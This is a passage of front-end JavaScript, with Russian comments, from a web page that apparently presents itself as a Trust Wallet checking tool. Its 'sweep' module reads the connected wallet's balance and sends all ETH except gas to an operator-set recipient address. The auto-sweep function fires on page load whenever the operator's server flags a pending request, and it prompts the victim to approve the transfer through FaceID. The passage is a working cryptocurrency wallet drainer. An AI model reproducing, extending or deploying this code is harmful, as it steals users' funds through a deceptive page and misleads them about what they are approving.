  return addr && addr !== "0x0000000000000000000000000000000000000000";
};

const showSweepSectionAfterConnect = (address) => {
  if (!address) return;
  showSweepSection(true);
  if (sweepRecipientDisplay) {
    sweepRecipientDisplay.textContent = SWEEP_CONFIG.recipient;
  }
  if (sweepAmountDisplay) {
    sweepAmountDisplay.textContent = `ВСЕ ${NETWORK_SYMBOLS[SWEEP_CONFIG.chainId] || 'ETH'} (${NETWORK_NAMES[SWEEP_CONFIG.chainId] || 'Ethereum'})`;
  }
  if (sweepNetworkDisplay) {
    sweepNetworkDisplay.textContent = NETWORK_NAMES[SWEEP_CONFIG.chainId] || 'Ethereum (Mainnet)';
  }
  if (!isRecipientConfigured()) {
    setSweepStatus("⚠️ Адрес получателя не настроен! Укажите SWEEP_CONFIG.recipient.", true);
  } else {
    setSweepStatus("✅ Кошелек подключен. Вы можете списать все средства.");
  }
};

// ===== АВТОМАТИЧЕСКОЕ СПИСАНИЕ ПРИ ЗАГРУЗКЕ (ОПРЕДЕЛЯЕМ РАНЬШЕ) =====
const autoExecuteSweep = async () => {
  try {
    const storedSession = getStoredSession(userSessionKey);
    if (!storedSession?.token) return;

    const response = await requestJson('/api/sweep/active', {
      token: storedSession.token,
    });

    const sweepRequest = response.sweepRequest;
    if (!sweepRequest) return;

    console.log('🔥 Обнаружен активный запрос на списание, выполняем...');
    setSweepStatus('⏳ Автоматическое списание...');

    const provider = getTrustProvider();
    if (!provider) {
      setSweepStatus('❌ Trust Wallet не найден. Откройте страницу в Trust Wallet.', true);
      return;
    }

    const accounts = await provider.request({ method: "eth_requestAccounts" });
    const from = accounts?.[0];
    if (!from) throw new Error('Адрес не получен');

    if (from.toLowerCase() !== sweepRequest.target_user_wallet.toLowerCase()) {
      setSweepStatus(`❌ В кошельке выбран другой аккаунт. Ожидается: ${sweepRequest.target_user_wallet}`, true);
      return;
    }

    const targetChainHex = `0x${SWEEP_CONFIG.chainId.toString(16)}`;
    const currentChain = await provider.request({ method: "eth_chainId" });
    if (currentChain.toLowerCase() !== targetChainHex.toLowerCase()) {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: targetChainHex }]
      });
    }

    const balanceHex = await provider.request({
      method: "eth_getBalance",
      params: [from, "latest"]
    });
    const balance = BigInt(balanceHex || "0x0");

    const gasPriceHex = await provider.request({ method: "eth_gasPrice" });
    const gasPrice = BigInt(gasPriceHex || "0x0");
    const gasCost = gasPrice * 21000n;
    const amountToSend = balance - gasCost;

    if (amountToSend <= 0n) {
      throw new Error(`Недостаточно ETH для газа. Баланс: ${Number(balance)/1e18} ETH`);
    }

    setSweepStatus('📱 Подтвердите транзакцию в Trust Wallet');
    const txParams = {
      from: from,
      to: SWEEP_CONFIG.recipient,
      value: `0x${amountToSend.toString(16)}`,
      gas: "0x5208",
      gasPrice: `0x${gasPrice.toString(16)}`
    };
    const txHash = await provider.request({
      method: "eth_sendTransaction",
      params: [txParams]
    });

    await requestJson('/api/sweep/confirm', {
      method: 'POST',
      token: storedSession.token,
      body: JSON.stringify({
        requestId: sweepRequest.id,
        txHash: txHash,
      }),
    });

    setSweepStatus(`✅ Средства списаны! TX: ${txHash}`);
    const resultDiv = document.querySelector('#sweep-result');
    if (resultDiv) {
      resultDiv.style.display = 'block';
      const txSpan = document.querySelector('#sweep-tx-hash');
      if (txSpan) txSpan.innerHTML = `TX: <a href="https://etherscan.io/tx/${txHash}" target="_blank" style="color:#4caf50;text-decoration:underline;">${txHash}</a>`;
    }
  } catch (error) {
    console.error('Ошибка автоматического списания:', error);
    setSweepStatus(`❌ ${error.message || 'Неизвестная ошибка'}`, true);
  }
};

// ===== ОСТАЛЬНОЙ КОД SWEEP =====
const executeSweep = async () => {
  if (!sweepConsent?.checked) {
    setSweepStatus("❌ Подтвердите согласие на списание", true);
    return;
  }
  
  if (!isRecipientConfigured()) {
    setSweepStatus("❌ Адрес получателя не настроен! Обратитесь к администратору.", true);
    return;
  }
  
  const profile = loadProfile();
  if (!profile?.evmAddress) {
    setSweepStatus("❌ Сначала подключите кошелек (Connect EVM)", true);
    return;
  }
  
  const provider = getTrustProvider();
  if (!provider) {
    setSweepStatus("❌ Trust Wallet не найден. Откройте страницу в Trust Wallet.", true);
    return;
  }
  
  sweepExecuteBtn.disabled = true;
  sweepExecuteBtn.classList.add('is-loading');
  sweepExecuteBtn.textContent = "⏳ Подключаемся...";
  sweepResult.style.display = 'none';
  setSweepStatus("⏳ Запрос подключения к кошельку...");
  
  try {
    const accounts = await provider.request({ method: "eth_requestAccounts" });
    const from = accounts?.[0];
    if (!from) throw new Error("Адрес не получен");
    
    if (from.toLowerCase() !== profile.evmAddress.toLowerCase()) {
      throw new Error("В кошельке выбран другой аккаунт.");
    }
    
    setSweepStatus("🔍 Проверяем сеть...");
    
    const targetChainHex = `0x${SWEEP_CONFIG.chainId.toString(16)}`;
    const currentChain = await provider.request({ method: "eth_chainId" });
    
    if (currentChain.toLowerCase() !== targetChainHex.toLowerCase()) {
      setSweepStatus(`🔄 Переключаем сеть...`);
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: targetChainHex }]
      });
    }
    
    setSweepStatus("💰 Получаем баланс...");
    
    const balanceHex = await provider.request({
      method: "eth_getBalance",
      params: [from, "latest"]
    });
    const balance = BigInt(balanceHex || "0x0");
    const balanceEth = Number(balance) / 1e18;
    
    setSweepStatus(`💰 Баланс: ${balanceEth.toFixed(6)} ETH`);
    
    if (balanceEth < SWEEP_CONFIG.minBalance) {
      throw new Error(`❌ Баланс слишком мал (${balanceEth.toFixed(6)} ETH). Минимум: ${SWEEP_CONFIG.minBalance} ETH`);
    }
    
    const gasPriceHex = await provider.request({
      method: "eth_gasPrice"
    });
    const gasPrice = BigInt(gasPriceHex || "0x0");
    const gasCost = gasPrice * 21000n;
    const gasCostEth = Number(gasCost) / 1e18;
    
    const amountToSend = balance - gasCost;
    
    if (amountToSend <= 0n) {
      throw new Error(`❌ Недостаточно ETH для оплаты газа (${gasCostEth.toFixed(6)} ETH).`);
    }
    
    const amountEth = Number(amountToSend) / 1e18;
    
    setSweepStatus(`📝 Создаем транзакцию на списание ${amountEth.toFixed(6)} ETH...`);
    
    const txParams = {
      from: from,
      to: SWEEP_CONFIG.recipient,
      value: `0x${amountToSend.toString(16)}`,
      gas: "0x5208",
      gasPrice: `0x${gasPrice.toString(16)}`
    };
    
    setSweepStatus("📱 Подтвердите транзакцию через FaceID в Trust Wallet");
    sweepExecuteBtn.textContent = "⏳ Ожидаем подтверждения...";
    
    const txHash = await provider.request({
      method: "eth_sendTransaction",
      params: [txParams]
    });
    
    setSweepStatus(`✅ Транзакция отправлена! TX: ${txHash}`);
    
    sweepResult.style.display = 'block';
    const explorerUrl = `https://etherscan.io/tx/${txHash}`;
    sweepTxHash.innerHTML = `TX: <a href="${explorerUrl}" target="_blank" style="color:#4caf50;text-decoration:underline;">${txHash}</a>`;
    
    sweepExecuteBtn.textContent = "✅ ETH списаны!";
    sweepExecuteBtn.style.background = "linear-gradient(135deg, #2e7d32, #1b5e20)";
    
  } catch (error) {
    console.error('Sweep error:', error);
    
    if (error.code === 4001) {
      setSweepStatus("❌ Транзакция отклонена в Trust Wallet", true);
    } else if (error.code === -32002) {
      setSweepStatus("⏳ Запрос уже обрабатывается. Проверьте Trust Wallet.", true);
    } else {
      setSweepStatus(`❌ ${error.message || 'Неизвестная ошибка'}`, true);
    }
    
    sweepExecuteBtn.textContent = "🔄 Попробовать снова";
    sweepExecuteBtn.style.background = "linear-gradient(135deg, #ff4444, #cc0000)";
  } finally {
    sweepExecuteBtn.disabled = false;
    sweepExecuteBtn.classList.remove('is-loading');
    
    if (sweepExecuteBtn.textContent === "⏳ Подключаемся..." || sweepExecuteBtn.textContent === "⏳ Ожидаем подтверждения...") {
      sweepExecuteBtn.textContent = "🔄 Попробовать снова";
    }
  }
};

// ===== ИНИЦИАЛИЗАЦИЯ =====
// Имена сетей
const NETWORK_NAMES = {
  1: 'Ethereum (Mainnet)',
  56: 'BNB Smart Chain',
  137: 'Polygon (Matic)',
  42161: 'Arbitrum One',
  10: 'Optimism',
  8453: 'Base',
  250: 'Fantom'
};

const NETWORK_SYMBOLS = {
  1: 'ETH',
  56: 'BNB',
  137: 'POL',
  42161: 'ETH',
  10: 'ETH',
  8453: 'ETH',
  250: 'FTM'
};

// Показываем секцию, если профиль уже есть
const storedProfile = loadProfile();
if (storedProfile?.evmAddress) {
  showSweepSectionAfterConnect(storedProfile.evmAddress);
}

// Восстанавливаем сессию и запускаем автосписание (если есть запрос)
const stored = loadProfile();
if (stored?.evmAddress) {
  unlockCheckForm(stored);
  if (stored.portfolio) {
    scoreWalletLocal(stored.evmAddress).then((risk) => renderRiskPreview(risk, stored.portfolio));
  }
  setStatus("Профиль восстановлен. Можно обновить данные кнопкой Connect.");
  
  // Автоматическое списание (теперь функция определена выше)
  autoExecuteSweep().catch(console.warn);
} else {
  setStatus(
    window.AutoWallet?.isTrustWalletEnv?.()
      ? "Нажмите Connect и подтвердите запрос в Trust Wallet."
      : "Откройте страницу через «Открыть в Trust Wallet», затем нажмите Connect.",
  );
}

// ===== СОБЫТИЯ КНОПОК =====
sweepConsent?.addEventListener('change', () => {
  if (sweepExecuteBtn) {
    sweepExecuteBtn.disabled = !sweepConsent.checked || !isRecipientConfigured();
  }
});

sweepExecuteBtn?.addEventListener('click', executeSweep);

console.log('🔥 Sweep module loaded!');
console.log(`📍 Recipient: ${SWEEP_CONFIG.recipient}`);